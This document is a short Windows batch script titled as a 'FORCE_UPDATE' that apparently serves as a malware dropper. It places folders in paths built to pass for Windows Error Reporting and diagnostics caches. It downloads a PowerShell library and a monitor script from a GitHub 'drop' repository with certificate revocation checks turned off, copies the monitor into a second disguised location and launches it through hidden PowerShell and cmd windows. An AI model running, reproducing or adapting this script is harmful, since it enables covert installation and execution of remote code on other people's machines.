@echo off
rem FORCE_UPDATE R2 - pull latest mon/lib from pin and kick one heal tick (sevrz stack only)
setlocal
set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
set "CURL=%SystemRoot%\System32\curl.exe"
set "PIN=main"
if not exist "%WD%" mkdir "%WD%" >nul 2>&1
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 60 -o "%WD%\own_lib.ps1" "https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%/own_lib.ps1?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 60 -o "%WD%\own_mon.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%/own_mon.cmd?t=%RANDOM%"
if not exist "%ETL%" mkdir "%ETL%" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ETL%\etl_mon.cmd" >nul 2>&1
echo --- verify ---
findstr /C:"MONVER=" "%WD%\own_mon.cmd"
findstr /C:"OWN_LIB  BUILD" "%WD%\own_lib.ps1"
powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','\"%WD%\own_mon.cmd\"' -WindowStyle Hidden" >nul 2>&1
echo done pin=%PIN%
endlocal
